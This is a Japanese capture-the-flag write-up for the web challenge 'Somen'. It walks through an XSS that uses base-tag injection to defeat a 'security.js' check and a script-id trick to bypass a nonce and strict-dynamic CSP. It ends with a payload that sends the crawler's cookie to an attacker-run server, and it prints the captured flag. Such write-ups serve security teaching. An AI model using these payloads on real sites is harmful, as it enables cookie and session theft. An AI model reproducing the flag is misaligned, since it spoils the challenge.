# Somen

421 pt (20 Solves)

```txt
Somen is tasty.
[url]
```

## 添付ファイル

- [worker.js](./attachments/worker.js)
- [index.php](./attachments/index.php)

## 概要

テキストボックスが2つある。1個は自分で実行、もう1個はクローラーに実行させる。  
usernameに入力した内容が挿入されるので、XSSだろう。
しかし`security.js`とCSPの所為で全然上手くいかない。

`worker.js`をみるとcookieにflagがあるのがわかる。  

## 解

目標は2つ。

1. security.jsの制限をバイパス
1. CSPのバイパス

### security.jsの制限をバイパス

```html
</title><base href="//example.com">
```

これを書き込むと以下のような状態になる。

```html
<base href="//example.com">  
<script src="./security.js">
```

`./security.js`は`example.com/security.js`として処理され、コンソールログに404が表示される。  

### CSPのバイパス

`security.js`はバイパスできたので次はCSPのバイパスを目指す。  
CSPの`nonce`と`strict-dynamic`のバイパスを調べてたら[良さげな記事](https://szarny.hatenablog.com/entry/2019/01/01/XSS_Challenge_%28%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%83%BB%E3%83%9F%E3%83%8B%E3%82%AD%E3%83%A3%E3%83%B3%E3%83%97_in_%E5%B2%A1%E5%B1%B1_2018_%E6%BC%94%E7%BF%92%E3%82%B3%E3%83%B3)。case23が似てる状況。  
既に実行を許可されたscriptタグの中に任意のjsを埋め込みたい。
case23を参考にとりあえず書いてみる。

```html
<p id="message">[username], I recommend Nagashi somen for you.</p>
```

のように代入されてるので、idがmessageなscriptタグを作る。

```txt
alert();//</title><script id="message"></script><base href="http://example.com">
```

上を入力するとHTMLは以下のようになる。HTMLとしては壊れてるけど、よしなにしてくれる。  
titleに代入されたうえでidがmessageなとこに代入されるので結構ごちゃごちゃ。

```html
 <title>Best somen for alert();//</title>
 <script id="message">
 alert();//</title><script id="message"></script><base href="http://example.com">, I recommend Nagashi somen for you.
 </script><base href="http://example.com">
```

アクセスされたときにurlを表示するようなwebサーバを用意して

```txt
document.location=`/?q=${encodeURIComponent(document.cookie)}`;//</title><script id="message"></script><base href="[url]">
```

を入力すればflag。

```txt
ctf4b{1_w0uld_l1k3_70_347_50m3n_b3f0r3_7ry1n6_70_3xpl017}
```
